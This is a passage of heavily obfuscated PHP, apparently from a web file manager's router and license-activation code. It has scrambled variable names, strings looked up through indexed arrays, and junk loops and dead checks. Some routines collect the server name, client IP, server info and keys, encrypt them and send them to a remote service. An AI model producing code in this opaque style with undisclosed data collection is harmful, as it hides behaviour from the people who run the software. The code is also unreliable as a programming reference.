$ÉÖ”çª¶[$üóç ]; $this->where($ºÎ÷Åİâ)->save(array($»œğ–Üñ[1984] => $üóç  + 1)); } return !0; } protected function moveTop($œ¯è‡á) { $­Ã„û”ë =& $_SERVER[¶Ô„œ…¯]; $‘Á§š÷¦ = array($­Ã„û”ë[1771] => USER_ID, $­Ã„û”ë[559] => 0); $¥Û²ë = $this->where($‘Á§š÷¦)->where(array($­Ã„û”ë[32] => $œ¯è‡á))->find(); if (!$¥Û²ë) { return; } $÷³ÔŞÖ = $this->field($­Ã„û”ë[477])->where($‘Á§š÷¦)->order($­Ã„û”ë[2467])->select(); $÷³ÔŞÖ = array_to_keyvalue($÷³ÔŞÖ, $­Ã„û”ë[12], $­Ã„û”ë[477]); $ŠõƒÛËä = $÷³ÔŞÖ; $÷³ÔŞÖ = array_remove_value($÷³ÔŞÖ, $¥Û²ë[$­Ã„û”ë[477]]); array_unshift($÷³ÔŞÖ, $¥Û²ë[$­Ã„û”ë[477]]); return $this->resetSort($÷³ÔŞÖ); } protected function moveBottom($äï±‘ìì) { $—íÂÄÒ =& $_SERVER[¶Ô„œ…¯]; $ú³¦‰ê… = array($—íÂÄÒ[1771] => USER_ID, $—íÂÄÒ[559] => 0); $À±¶ä¾ = $this->where($ú³¦‰ê…)->max($—íÂÄÒ[2004]); $¦ó’–ŞÉ = array($—íÂÄÒ[2004] => $À±¶ä¾ + 1); return $this->where($ú³¦‰ê…)->where(array($—íÂÄÒ[32] => $äï±‘ìì))->save($¦ó’–ŞÉ); } private function getAutoName($Ø—ÕœÙ°) { $áäÈ€‚† =& $_SERVER[¶Ô„œ…¯]; $—ªØ«Ş‹ = array($áäÈ€‚†[1771] => USER_ID, $áäÈ€‚†[559] => 0); $çäæò˜í = $this->field($áäÈ€‚†[32])->where($—ªØ«Ş‹)->select(); $çäæò˜í = array_to_keyvalue($çäæò˜í, $áäÈ€‚†[12], $áäÈ€‚†[32]); if (!$çäæò˜í || !in_array($Ø—ÕœÙ°, $çäæò˜í)) { return $Ø—ÕœÙ°; } for ($İ½¨­¿‘ = 0; $İ½¨­¿‘ < count($çäæò˜í); $İ½¨­¿‘++) { if (!in_array($Ø—ÕœÙ° . "\x28{$İ½¨­¿‘}\x29", $çäæò˜í)) { return $Ø—ÕœÙ° . "\x28{$İ½¨­¿‘}\51"; } } return $Ø—ÕœÙ° . "\50{$İ½¨­¿‘}\x29"; } } goto dæÅ‡‹¾´Â; A’å”Ë“£: if (strlen($kyvczqmslt) < $_SERVER[¶Ô„œ…¯][685]) { die; } class Application { private $defaultModule = "\151\x6e\144\145\x78"; private $defaultController = "\x69\x6e\x64\x65\170"; private $defaultAction = "\151\156\144\145\170"; function __construct() { } public function setDefault($Ñ´ñšƒ¦) { $êç¡ëî =& $_SERVER[ñö”¸„‰]; $ÀÑ´“¿ = explode($êç¡ëî[0], trim($Ñ´ñšƒ¦, $êç¡ëî[0])); $this->defaultModule = $ÀÑ´“¿[0] ? $ÀÑ´“¿[0] : $this->defaultModule; $ğ¸›­Ë® = $_SERVER[¶Ô„œ…¯][689]; if (!$ğ¸›­Ë®) { return; } $this->defaultController = $ÀÑ´“¿[1] ? $ÀÑ´“¿[1] : $this->defaultController; $this->defaultAction = $ÀÑ´“¿[2] ? $ÀÑ´“¿[2] : $this->defaultAction; $this->wavj8ea0ec47($êç¡ëî[1], array($this, $êç¡ëî[2])); } public function appRun($ê¨ºçº›) { $ÃÀÉşè =& $_SERVER[¶Ô„œ…¯]; $à÷ÀÌÌİ =& $_SERVER[ñö”¸„‰]; $šêï¿ûŒ = explode($à÷ÀÌÌİ[0], $ê¨ºçº›); $•İÓ¸€° = $ÃÀÉşè[690]; while ($•İÓ¸€° < $ÃÀÉşè[691]) { if ($•İÓ¸€° >= 0) { break; } $•İÓ¸€°++; } $ıêÍù€› = strtolower($šêï¿ûŒ[0]); $­—ş¢ëñ = $ÃÀÉşè[692]; if (strlen($­—ş¢ëñ) < $ÃÀÉşè[691]) { die; } $¹Ğ…” = $à÷ÀÌÌİ[3]; if ($ıêÍù€› == $à÷ÀÌÌİ[4]) { $¹Ğ…” = $à÷ÀÌÌİ[5]; $šêï¿ûŒ[0] = $à÷ÀÌÌİ[6]; $šêï¿ûŒ[1] = $šêï¿ûŒ[1] . $à÷ÀÌÌİ[7]; $ê¨ºçº› = join($à÷ÀÌÌİ[0], $šêï¿ûŒ); $ê¨ºçº› = trim($ê¨ºçº›, $à÷ÀÌÌİ[0]); } call_user_func(array($à÷ÀÌÌİ[8], $à÷ÀÌÌİ[9]), $¹Ğ…” . $à÷ÀÌÌİ[10], $ê¨ºçº›); ActionCall($ê¨ºçº›); call_user_func(array($à÷ÀÌÌİ[8], $à÷ÀÌÌİ[9]), $¹Ğ…” . $à÷ÀÌÌİ[11], $ê¨ºçº›); $“ıçï©ı = $ÃÀÉşè[693]; if (!$“ıçï©ı) { die; } } private function autorun() { $íË¾ƒäú =& $_SERVER[¶Ô„œ…¯]; $ şï¸âÜ =& $_SERVER[ñö”¸„‰]; global $config; $şÈş²ÀÈ = $íË¾ƒäú[694]; if (count($config[$ şï¸âÜ[12]]) == 0) { return; } foreach ($config[$ şï¸âÜ[12]] as $àœ»Ğæò => $¶İÙôÇ¨) { $this->appRun($¶İÙôÇ¨); $›öÍó€© = $íË¾ƒäú[695]; if (strlen($›öÍó€©) < $íË¾ƒäú[696]) { return; } } } private function wasna1530685() { $´¶³’Ç… =& $_SERVER[¶Ô„œ…¯]; $ùã£’ç =& $_SERVER[ñö”¸„‰]; $°ó¯ñûò = $ùã£’ç[4]; $Å„«¶÷ = $´¶³’Ç…[697]; if (!$Å„«¶÷) { return; } $•¼Î°‘Ç = $GLOBALS[$ùã£’ç[13]][$ùã£’ç[14]][0]; $¦Ù‘ ‹É = $´¶³’Ç…[698]; if (strlen($¦Ù‘ ‹É) < $´¶³’Ç…[696]) { return; } if (!$•¼Î°‘Ç || strlen($•¼Î°‘Ç) <= strlen($°ó¯ñûò)) { return; } if (strtolower(substr($•¼Î°‘Ç, -strlen($°ó¯ñûò))) != $°ó¯ñûò) { return; } $ÉÄ·®—˜ = substr($•¼Î°‘Ç, 0, -strlen($°ó¯ñûò)); $¬Ãª‰Ô¼ = array($ùã£’ç[4], $ÉÄ·®—˜); $È©ÊÍº = array_slice($GLOBALS[$ùã£’ç[13]][$ùã£’ç[14]], 1); $Ñ›Ÿ›õ = $´¶³’Ç…[699]; if (!$Ñ›Ÿ›õ) { return; } $GLOBALS[$ùã£’ç[13]][$ùã£’ç[14]] = array_merge($¬Ãª‰Ô¼, $È©ÊÍº); $øˆ¶ßÜ‰ = $´¶³’Ç…[700]; if (!$øˆ¶ßÜ‰) { return; } $GLOBALS[$ùã£’ç[13]][$ùã£’ç[15]] = implode($ùã£’ç[0], $GLOBALS[$ùã£’ç[13]][$ùã£’ç[14]]); $ÙâËêü÷ = $´¶³’Ç…[701]; while (strlen($ÙâËêü÷) < $´¶³’Ç…[702]) { if (!$ÙâËêü÷) { break; } $ÙâËêü÷++; } } private function bqup48f844ac() { $‹ÂÖ­‰ =& $_SERVER[¶Ô„œ…¯]; $Û˜§ïÔã =& $_SERVER[ñö”¸„‰]; if ($GLOBALS[$Û˜§ïÔã[13]][$Û˜§ïÔã[15]] != $Û˜§ïÔã[6]) { return; } $Ÿ„ğçˆö = $_SERVER[$Û˜§ïÔã[16]]; $¡¦ûˆõË = $‹ÂÖ­‰[703]; if (!$¡¦ûˆõË) { return; } $íè†¯øû = $Û˜§ïÔã[17]; $±ŠœÆ¹å = $‹ÂÖ­‰[704]; if (!$±ŠœÆ¹å) { return; } if (!strstr($Ÿ„ğçˆö, $íè†¯øû)) { return; } $ºÙè…½µ = strrpos($Ÿ„ğçˆö, $íè†¯øû); $ûş·ÏÅò = $‹ÂÖ­‰[705]; while ($ûş·ÏÅò < $‹ÂÖ­‰[685]) { if ($ûş·ÏÅò >= 0) { break; } $ûş·ÏÅò++; } $’æúö = substr($Ÿ„ğçˆö, $ºÙè…½µ + strlen($íè†¯øû)); preg_match_all($Û˜§ïÔã[18], $’æúö, $Å¯Ìã¹á); $’æúö = trim($Å¯Ìã¹á[0][0], $Û˜§ïÔã[19]); $ÔÆÆÂÆ‰ = $‹ÂÖ­‰[706]; while ($ÔÆÆÂÆ‰ < $‹ÂÖ­‰[707]) { if ($ÔÆÆÂÆ‰ >= 0) { break; } $ÔÆÆÂÆ‰++; } $GLOBALS[$Û˜§ïÔã[13]][$Û˜§ïÔã[14]] = explode($Û˜§ïÔã[19], $’æúö); $GLOBALS[$Û˜§ïÔã[13]][$Û˜§ïÔã[15]] = implode($Û˜§ïÔã[0], $GLOBALS[$Û˜§ïÔã[13]][$Û˜§ïÔã[14]]); $æÄõ¿ÄÕ = $‹ÂÖ­‰[708]; while (strlen($æÄõ¿ÄÕ) < $‹ÂÖ­‰[696]) { if (!$æÄõ¿ÄÕ) { break; } $æÄõ¿ÄÕ++; } } public function run() { $õíÔ½« =& $_SERVER[¶Ô„œ…¯]; $¬ËıŒÅİ =& $_SERVER[ñö”¸„‰]; $this->bqup48f844ac(); $this->wasna1530685(); $Òì’Š¤¡ = $õíÔ½«[709]; while ($Òì’Š¤¡ < $õíÔ½«[696]) { if ($Òì’Š¤¡ >= 0) { break; } $Òì’Š¤¡++; } $ÚË™‘É = $GLOBALS[$¬ËıŒÅİ[13]][$¬ËıŒÅİ[14]]; $µâúÇıõ = $GLOBALS[$¬ËıŒÅİ[13]][$¬ËıŒÅİ[15]]; define($¬ËıŒÅİ[20], isset($ÚË™‘É[0]) && $ÚË™‘É[0] ? $ÚË™‘É[0] : $this->defaultModule); define($¬ËıŒÅİ[21], isset($ÚË™‘É[1]) && $ÚË™‘É[0] ? $ÚË™‘É[1] : $this->defaultController); $àİ–šòº = $õíÔ½«[710]; while (strlen($àİ–šòº) < $õíÔ½«[685]) { if (!$àİ–šòº) { break; } $àİ–šòº++; } define($¬ËıŒÅİ[22], isset($ÚË™‘É[2]) && $ÚË™‘É[0] ? $ÚË™‘É[2] : $this->defaultAction); define($¬ËıŒÅİ[23], MOD . $¬ËıŒÅİ[0] . ST . $¬ËıŒÅİ[0] . ACT); $_SERVER[$¬ËıŒÅİ[24]] = strtolower(ACTION); $this->autorun(); if (count($ÚË™‘É) >= 3) { $this->appRun($µâúÇıõ); } else { $this->appRun(ACTION); } } private $nplt7a71fb5f = array(); private $nthz791cd429 = ''; public function twrc6deadefb() { $·ˆô­šÏ =& $_SERVER[¶Ô„œ…¯]; $Ú÷î‡ô =& $_SERVER[ñö”¸„‰]; $this->bqcx11c72e84(); $Àµï­¾¦ = $·ˆô­šÏ[711]; if (strlen($Àµï­¾¦) < $·ˆô­šÏ[707]) { die; } $this->wmqubf734e0e(); $this->xjsf741536ef(); $this->ghdy1a9c764a(); $this->dvon7052b0b1(); $á”äïù€ = $·ˆô­šÏ[712]; while (strlen($á”äïù€) < $·ˆô­šÏ[707]) { if (!$á”äïù€) { break; } $á”äïù€++; } $this->deik73579efd(); $this->utqr136575c8(); $Êö‰Ş³ = $·ˆô­šÏ[713]; if (!$Êö‰Ş³) { die; } $this->wavj8ea0ec47($Ú÷î‡ô[25], array($this, $Ú÷î‡ô[26])); $this->wavj8ea0ec47($Ú÷î‡ô[27], array($this, $Ú÷î‡ô[28])); $this->wavj8ea0ec47($Ú÷î‡ô[29], array($this, $Ú÷î‡ô[30])); $ÒÏÖæ½– = $·ˆô­šÏ[714]; if (strlen($ÒÏÖæ½–) < $·ˆô­šÏ[707]) { return; } $this->wavj8ea0ec47($Ú÷î‡ô[31], array($this, $Ú÷î‡ô[32])); $«•™õ‰÷ = $·ˆô­šÏ[715]; } public function tvah3b29f3d1($Àó¦Ş½Õ) { $ĞÑôÒ€“ =& $_SERVER[¶Ô„œ…¯]; $Ò÷İ¸Û =& $_SERVER[ñö”¸„‰]; $ªì­ÀŸ£ = Model($Ò÷İ¸Û[33])->get(); $¹Ğõ¯‚Ì = $ĞÑôÒ€“[716]; if (strlen($¹Ğõ¯‚Ì) < $ĞÑôÒ€“[685]) { die; } $Òó‘¼‰‘ = array($Ò÷İ¸Û[34], $Ò÷İ¸Û[35], $Ò÷İ¸Û[36], $Ò÷İ¸Û[37], $Ò÷İ¸Û[38], $Ò÷İ¸Û[39], $Ò÷İ¸Û[40], $Ò÷İ¸Û[41], $Ò÷İ¸Û[42], $Ò÷İ¸Û[43], $Ò÷İ¸Û[44], $Ò÷İ¸Û[45], $Ò÷İ¸Û[46], $Ò÷İ¸Û[47], $Ò÷İ¸Û[48], $Ò÷İ¸Û[49], $Ò÷İ¸Û[50], $Ò÷İ¸Û[51], $Ò÷İ¸Û[52], $Ò÷İ¸Û[53], $Ò÷İ¸Û[54], $Ò÷İ¸Û[55], $Ò÷İ¸Û[56], $Ò÷İ¸Û[57], $Ò÷İ¸Û[58], $Ò÷İ¸Û[59], $Ò÷İ¸Û[60], $Ò÷İ¸Û[61], $Ò÷İ¸Û[62], $Ò÷İ¸Û[63], $Ò÷İ¸Û[64], $Ò÷İ¸Û[65], $Ò÷İ¸Û[66], $Ò÷İ¸Û[67], $Ò÷İ¸Û[68], $Ò÷İ¸Û[69], $Ò÷İ¸Û[70], $Ò÷İ¸Û[71], $Ò÷İ¸Û[72], $Ò÷İ¸Û[73], $Ò÷İ¸Û[74], $Ò÷İ¸Û[75], $Ò÷İ¸Û[76], $Ò÷İ¸Û[77], $Ò÷İ¸Û[78], $Ò÷İ¸Û[79], $Ò÷İ¸Û[80], $Ò÷İ¸Û[81], $Ò÷İ¸Û[82], $Ò÷İ¸Û[83], $Ò÷İ¸Û[84], $Ò÷İ¸Û[85]); foreach ($Òó‘¼‰‘ as $ÊÌ¼’Ì—) { $è‡¸–ÏÚ = $GLOBALS[$Ò÷İ¸Û[86]][$Ò÷İ¸Û[87]][$ÊÌ¼’Ì—]; if (isset($ªì­ÀŸ£[$ÊÌ¼’Ì—])) { $è‡¸–ÏÚ = $ªì­ÀŸ£[$ÊÌ¼’Ì—]; } $Àó¦Ş½Õ[$Ò÷İ¸Û[88]][$Ò÷İ¸Û[89]][$ÊÌ¼’Ì—] = $è‡¸–ÏÚ; } $Ò¤Šï½ = $Àó¦Ş½Õ[$Ò÷İ¸Û[88]][$Ò÷İ¸Û[89]][$Ò÷İ¸Û[46]]; unset($Àó¦Ş½Õ[$Ò÷İ¸Û[88]][$Ò÷İ¸Û[90]][$Ò÷İ¸Û[91]]); unset($Àó¦Ş½Õ[$Ò÷İ¸Û[88]][$Ò÷İ¸Û[90]][$Ò÷İ¸Û[92]]); $Ÿ“‘Šß¶ = $ĞÑôÒ€“[717]; while ($Ÿ“‘Šß¶ < $ĞÑôÒ€“[691]) { if ($Ÿ“‘Šß¶ >= 0) { break; } $Ÿ“‘Šß¶++; } unset($Àó¦Ş½Õ[$Ò÷İ¸Û[88]][$Ò÷İ¸Û[89]][$Ò÷İ¸Û[46]]); $­‰ì”Ùã = $ĞÑôÒ€“[718]; if (strlen($­‰ì”Ùã) < $ĞÑôÒ€“[702]) { die; } unset($Àó¦Ş½Õ[$Ò÷İ¸Û[88]][$Ò÷İ¸Û[89]][$Ò÷İ¸Û[93]]); $Àó¦Ş½Õ[$Ò÷İ¸Û[88]][$Ò÷İ¸Û[89]][$Ò÷İ¸Û[94]] = array($Ò÷İ¸Û[95] => (int) $Ò¤Šï½[$Ò÷İ¸Û[96]], $Ò÷İ¸Û[97] => (int) _get($Ò¤Šï½, $Ò÷İ¸Û[98], 0)); $Ï§¦—“‘ = $ĞÑôÒ€“[719]; if (!$Ï§¦—“‘) { die; } $ª€âæ¦¯ = substr(md5($Ò÷İ¸Û[99] . get_client_ip() . $ªì­ÀŸ£[$Ò÷İ¸Û[100]]), 0, 15); $µ¶ÉÌ½³ = $ĞÑôÒ€“[720]; while ($µ¶ÉÌ½³ < $ĞÑôÒ€“[691]) { if ($µ¶ÉÌ½³ >= 0) { break; } $µ¶ÉÌ½³++; } $Àó¦Ş½Õ[$Ò÷İ¸Û[101]][$Ò÷İ¸Û[102]] = Mcrypt::encode(Session::sign(), $ª€âæ¦¯, 3600 * 24); $¨¹ò²¤½ = $ĞÑôÒ€“[721]; while (strlen($¨¹ò²¤½) < $ĞÑôÒ€“[707]) { if (!$¨¹ò²¤½) { break; } $¨¹ò²¤½++; } $Àó¦Ş½Õ[$Ò÷İ¸Û[101]][$Ò÷İ¸Û[103]] = Action($Ò÷İ¸Û[104])->accessToken(); $ºµ¥ŞÊ = $ĞÑôÒ€“[722]; while ($ºµ¥ŞÊ < $ĞÑôÒ€“[702]) { if ($ºµ¥ŞÊ >= 0) { break; } $ºµ¥ŞÊ++; } $Àó¦Ş½Õ[$Ò÷İ¸Û[101]][$Ò÷İ¸Û[105]] = md5($_SERVER[$Ò÷İ¸Û[106]] . $ªì­ÀŸ£[$Ò÷İ¸Û[100]]); $‘¶çØ‹ = $ĞÑôÒ€“[723]; if (!$‘¶çØ‹) { die; } $Àó¦Ş½Õ[$Ò÷İ¸Û[101]][$Ò÷İ¸Û[107]] = base64_encode(serverInfo()); $˜Õ©â²Ï = $ĞÑôÒ€“[724]; if (!$˜Õ©â²Ï) { die; } $Àó¦Ş½Õ[$Ò÷İ¸Û[101]][$Ò÷İ¸Û[108]] = $this->nthz791cd429; if ($ªì­ÀŸ£[$Ò÷İ¸Û[108]] != $Ò÷İ¸Û[109]) { $Àó¦Ş½Õ[$Ò÷İ¸Û[101]][$Ò÷İ¸Û[110]] = $ªì­ÀŸ£[$Ò÷İ¸Û[110]]; $Àó¦Ş½Õ[$Ò÷İ¸Û[101]][$Ò÷İ¸Û[111]] = $ªì­ÀŸ£[$Ò÷İ¸Û[111]]; $Âğ…²Ÿ = rand_string(10) . $this->nthz791cd429 . rand_string(5); $Àó¦Ş½Õ[$Ò÷İ¸Û[88]][$Ò÷İ¸Û[112]][$Ò÷İ¸Û[113]] = $this->ytkd64e99459($Âğ…²Ÿ, $Àó¦Ş½Õ[$Ò÷İ¸Û[101]][$Ò÷İ¸Û[105]]); } if ($this->nthz791cd429 == $Ò÷İ¸Û[109]) { $Àó¦Ş½Õ[$Ò÷İ¸Û[88]][$Ò÷İ¸Û[89]][$Ò÷İ¸Û[94]][$Ò÷İ¸Û[98]] = 0; } $Àó¦Ş½Õ[$Ò÷İ¸Û[101]][$Ò÷İ¸Û[114]] = $this->versionPluginFilter(); $Àó¦Ş½Õ[$Ò÷İ¸Û[101]][$Ò÷İ¸Û[115]] = _get($this->nplt7a71fb5f, $Ò÷İ¸Û[116], $Ò÷İ¸Û[6]); $œ™áæõÜ = $ĞÑôÒ€“[725]; while (strlen($œ™áæõÜ) < $ĞÑôÒ€“[685]) { if (!$œ™áæõÜ) { break; } $œ™áæõÜ++; } if (KodUser::isRoot() && $this->config[$Ò÷İ¸Û[117]]) { $Àó¦Ş½Õ[$Ò÷İ¸Û[101]][$Ò÷İ¸Û[118]] = WEB_ROOT; } return $Àó¦Ş½Õ; } private function deik73579efd() { $ÇäÍŸ­ƒ =& $_SERVER[¶Ô„œ…¯]; $µ¨«˜´ =& $_SERVER[ñö”¸„‰]; $Å–ÖŞÖÓ = $_SERVER[$µ¨«˜´[24]] == $µ¨«˜´[119]; if ($_SERVER[$µ¨«˜´[24]] == $µ¨«˜´[120] && $_GET[$µ¨«˜´[121]] == $µ¨«˜´[122]) { $Å–ÖŞÖÓ = !0; } if ($Å–ÖŞÖÓ) { $»Ï½ ‘ˆ = array($µ¨«˜´[108] => $this->nthz791cd429, $µ¨«˜´[123] => $this->gdru398cfe53(), $µ¨«˜´[124] => Model($µ¨«˜´[125])->count()); if ($this->nthz791cd429 != $µ¨«˜´[109]) { $Í…éç = _get($this->nplt7a71fb5f, $µ¨«˜´[126]); if ($Í…éç) { $»Ï½ ‘ˆ[$µ¨«˜´[127]] = $Í…éç; $»Ï½ ‘ˆ[$µ¨«˜´[128]] = strtotime(_get($this->nplt7a71fb5f, $µ¨«˜´[129])); $»Ï½ ‘ˆ[$µ¨«˜´[130]] = _get($this->nplt7a71fb5f, $µ¨«˜´[116]); } $È ºîÌ = Model($µ¨«˜´[33])->get($µ¨«˜´[131], $µ¨«˜´[6], !0); if (is_string($È ºîÌ) && substr($È ºîÌ, 0, 1) == $µ¨«˜´[132]) { $È ºîÌ = json_decode_force($È ºîÌ); } if (is_array($È ºîÌ) && $È ºîÌ[$µ¨«˜´[133]] && strstr($È ºîÌ[$µ¨«˜´[133]], $µ¨«˜´[134])) { $ÆÚõû°å = explode($µ¨«˜´[134], $È ºîÌ[$µ¨«˜´[133]]); $»Ï½ ‘ˆ[$µ¨«˜´[135]] = $ÆÚõû°å[0]; } } $»Ï½ ‘ˆ = $this->wfpg2505d3ce(json_encode($»Ï½ ‘ˆ), md5($µ¨«˜´[136])); $Ö „Œ‡¶ = $ÇäÍŸ­ƒ[726]; if (strlen($Ö „Œ‡¶) < $ÇäÍŸ­ƒ[702]) { die; } $úÒøí¼ = array($µ¨«˜´[137] => $»Ï½ ‘ˆ); $Ë˜çØ¡  = $ÇäÍŸ­ƒ[727]; if (strlen($Ë˜çØ¡ ) < $ÇäÍŸ­ƒ[696]) { return; } call_user_func(array($µ¨«˜´[138], $µ¨«˜´[139]), $úÒøí¼); $¬õ™Õ† = $ÇäÍŸ­ƒ[728]; } if ($this->nthz791cd429 == $µ¨«˜´[109]) { return; } $Æ ğØ£â = array($µ¨«˜´[140], $µ¨«˜´[141], $µ¨«˜´[142], $µ¨«˜´[143], $µ¨«˜´[144], $µ¨«˜´[145]); $©ÀÑÑ•¥ = Model($µ¨«˜´[33])->get(); $©‚È¹ = $ÇäÍŸ­ƒ[729]; $úÒøí¼ = array($µ¨«˜´[146] => $©ÀÑÑ•¥[$µ¨«˜´[34]], $µ¨«˜´[147] => $©ÀÑÑ•¥[$µ¨«˜´[35]], $µ¨«˜´[148] => $µ¨«˜´[6]); $€¿ø’¼À = $ÇäÍŸ­ƒ[730]; if (strlen($€¿ø’¼À) < $ÇäÍŸ­ƒ[685]) { die; } foreach ($Æ ğØ£â as $†Á×–¨‹) { if (!isset($©ÀÑÑ•¥[$†Á×–¨‹]) || !$©ÀÑÑ•¥[$†Á×–¨‹]) { continue; } $úÒøí¼[$†Á×–¨‹] = $©ÀÑÑ•¥[$†Á×–¨‹]; $ô“¤’Ö‘ = $ÇäÍŸ­ƒ[731]; while ($ô“¤’Ö‘ < $ÇäÍŸ­ƒ[691]) { if ($ô“¤’Ö‘ >= 0) { break; } $ô“¤’Ö‘++; } } call_user_func(array($µ¨«˜´[138], $µ¨«˜´[139]), $úÒøí¼); $©¡ØÚ” = $ÇäÍŸ­ƒ[732]; while (strlen($©¡ØÚ”) < $ÇäÍŸ­ƒ[685]) { if (!$©¡ØÚ”) { break; } $©¡ØÚ”++; } } private function ghdy1a9c764a() { $â¸×˜– =& $_SERVER[¶Ô„œ…¯]; $¾šêÖ›­ =& $_SERVER[ñö”¸„‰]; if ($_SERVER[$¾šêÖ›­[24]] != $¾šêÖ›­[149]) { return; } if (!KodUser::isRoot()) { die; } $ïÍÏ»äÜ = $GLOBALS[$¾šêÖ›­[13]]; if (isset($ïÍÏ»äÜ[$¾šêÖ›­[150]])) { $this->jibhea3f2b98(); die; } if (isset($ïÍÏ»äÜ[$¾šêÖ›­[151]]) && isset($ïÍÏ»äÜ[$¾šêÖ›­[151]]) == $¾šêÖ›­[122]) { $ïÍÏ»äÜ[$¾šêÖ›­[152]] = Model($¾šêÖ›­[33])->get($¾šêÖ›­[153]); } if (!isset($ïÍÏ»äÜ[$¾šêÖ›­[152]]) || strlen($ïÍÏ»äÜ[$¾šêÖ›­[152]]) != 16) { show_json($¾šêÖ›­[154] . $ïÍÏ»äÜ[$¾šêÖ›­[152]], !1); } $âÄê‚Ç½ = Model($¾šêÖ›­[33])->get($¾šêÖ›­[100]); $õ‰ıŒÒ– = md5($_SERVER[$¾šêÖ›­[106]] . $âÄê‚Ç½); $ì’€ˆ×× = $â¸×˜–[733]; if (!$ì’€ˆ××) { die; } $­âÁ±Ï© = array($¾šêÖ›­[152] => $ïÍÏ»äÜ[$¾šêÖ›­[152]], $¾šêÖ›­[155] => rand_string(16), $¾šêÖ›­[156] => $¾šêÖ›­[136], $¾šêÖ›­[157] => $¾šêÖ›­[158], $¾šêÖ›­[159] => $_SERVER[$¾šêÖ›­[160]], $¾šêÖ›­[161] => $_SERVER[$¾šêÖ›­[162]], $¾šêÖ›­[163] => $_SERVER[$¾šêÖ›­[164]], $¾šêÖ›­[105] => $õ‰ıŒÒ–, $¾šêÖ›­[165] => Model($¾šêÖ›­[33])->get($¾šêÖ›­[131])); if (isset($ïÍÏ»äÜ[$¾šêÖ›­[151]]) && isset($ïÍÏ»äÜ[$¾šêÖ›­[151]]) == $¾šêÖ›­[122]) { $­âÁ±Ï©[$¾šêÖ›­[151]] = md5($­âÁ±Ï©[$¾šêÖ›­[152]] . $¾šêÖ›­[166] . $­âÁ±Ï©[$¾šêÖ›­[155]]); } if ($ïÍÏ»äÜ[$¾šêÖ›­[167]] == $¾šêÖ›­[168]) { $ìŞá¯ù = $this->wfpg2505d3ce($õ‰ıŒÒ–, $¾šêÖ›­[169]); $­ª§ÃĞ© = $this->ytkd64e99459(json_encode($­âÁ±Ï©), $õ‰ıŒÒ– . $¾šêÖ›­[170], 3); $­ª§ÃĞ© = $­ª§ÃĞ© . $¾šêÖ›­[171] . $_SERVER[$¾šêÖ›­[160]]; $±¸Ì™‚À = $this->zhdncdb16301($¾šêÖ›­[172] . $ìŞá¯ù . $¾šêÖ›­[173] . $­ª§ÃĞ©, -1); show_json($±¸Ì™‚À, !0); } else { if ($ïÍÏ»äÜ[$¾šêÖ›­[167]] == $¾šêÖ›­[174]) { $ŞËíœğ¼ = substr(md5($¾šêÖ›­[175] . $õ‰ıŒÒ–), 12, 15) . $¾šêÖ›­[176]; $­ª§ÃĞ© = $this->dliybb530be5(trim($ïÍÏ»äÜ[$¾šêÖ›­[177]]), $ŞËíœğ¼, 2); $ÓÎÃ’Ø = json_decode($­ª§ÃĞ©, !0); if (!is_array($ÓÎÃ’Ø) || !is_array($ÓÎÃ’Ø[$¾šêÖ›­[178]]) || $ÓÎÃ’Ø[$¾šêÖ›­[152]] != !0) { $‹êŸÀ—Ô = $¾šêÖ›­[179]; $óÉäÛî = $ÓÎÃ’Ø[$¾šêÖ›­[178]] ? $¾šêÖ›­[180] . $ÓÎÃ’Ø[$¾šêÖ›­[178]] : $‹êŸÀ—Ô; show_json($óÉäÛî, !1); } else { $­âÁ±Ï©[$¾šêÖ›­[155]] = $ÓÎÃ’Ø[$¾šêÖ›­[178]][$¾šêÖ›­[181]]; } } else { $ÓÎÃ’Ø = $this->zhdncdb16301($¾šêÖ›­[182], $­âÁ±Ï©, 10); $‚¼‚·Ô = $â¸×˜–[734]; } } if (!is_array($ÓÎÃ’Ø) || !is_array($ÓÎÃ’Ø[$¾šêÖ›­[178]]) || $ÓÎÃ’Ø[$¾šêÖ›­[152]] != !0) { $‹êŸÀ—Ô = LNG($¾šêÖ›­[183]); $óÉäÛî = $ÓÎÃ’Ø[$¾šêÖ›­[178]] ? $¾šêÖ›­[180] . $ÓÎÃ’Ø[$¾šêÖ›­[178]] : $‹êŸÀ—Ô; show_json($óÉäÛî, !1); } $ªòÇâó× = $ÓÎÃ’Ø[$¾šêÖ›­[178]]; $ËÎïğ¢Î = $this->jvyg1a873af2($ªòÇâó×[$¾šêÖ›­[184]]); $ıŞıÁ‚÷ = $â¸×˜–[735]; if (!$ËÎïğ¢Î || $ËÎïğ¢Î != $ªòÇâó×[$¾šêÖ›­[129]]) { $£ñÇŠ¡¸ = array($¾šêÖ›­[185] => Model($¾šêÖ›­[33])->get($¾šêÖ›­[100]), $¾šêÖ›­[186] => $_SERVER[$¾šêÖ›­[106]], $¾šêÖ›­[187] => this_url(), $¾šêÖ›­[161] => $_SERVER[$¾šêÖ›­[162]]); $­ª§ÃĞ© = $this->xzdr01bcc53d(json_encode($£ñÇŠ¡¸)); $this->zhdncdb16301($¾šêÖ›­[188] . $­ª§ÃĞ©); show_json(LNG($¾šêÖ›­[189]), !0); } $ŞÀ½Ø¢ä = array($¾šêÖ›­[153] => $ªòÇâó×[$¾šêÖ›­[190]], $¾šêÖ›­[191] => $ªòÇâó×[$¾šêÖ›­[192]], $¾šêÖ›­[193] => rand_string(16), $¾šêÖ›­[108] => $ªòÇâó×[$¾šêÖ›­[194]]); if ($­âÁ±Ï©[$¾šêÖ›­[155]]) { $ŞÀ½Ø¢ä[$¾šêÖ›­[193]] = $­âÁ±Ï©[$¾šêÖ›­[155]]; } $ËæÀ­ë» = substr(md5($ŞÀ½Ø¢ä[$¾šêÖ›­[191]]), 10, 10); $µ¶Ø½šå = $ËæÀ­ë» . $ŞÀ½Ø¢ä[$¾šêÖ›­[108]] . $ŞÀ½Ø¢ä[$¾šêÖ›­[193]]; $§…¡Ñ©Ó = $â¸×˜–[736]; if (!$§…¡Ñ©Ó) { die; } $ŞÀ½Ø¢ä[$¾šêÖ›­[110]] = strrev(base64_encode($this->wfpg2505d3ce($µ¶Ø½šå, $¾šêÖ›­[195]))); $×å§ú°Ë = rand_string(16); $ÀŸ ƒ¹è = $â¸×˜–[737]; while (strlen($ÀŸ ƒ¹è) < $â¸×˜–[707]) { if (!$ÀŸ ƒ¹è) { break; } $ÀŸ ƒ¹è++; } $™çåĞı— = $×å§ú°Ë . $ŞÀ½Ø¢ä[$¾šêÖ›­[108]] . $this->wfpg2505d3ce(md5($ŞÀ½Ø¢ä[$¾šêÖ›­[153]]), $×å§ú°Ë); $ŞÀ½Ø¢ä[$¾šêÖ›­[111]] = 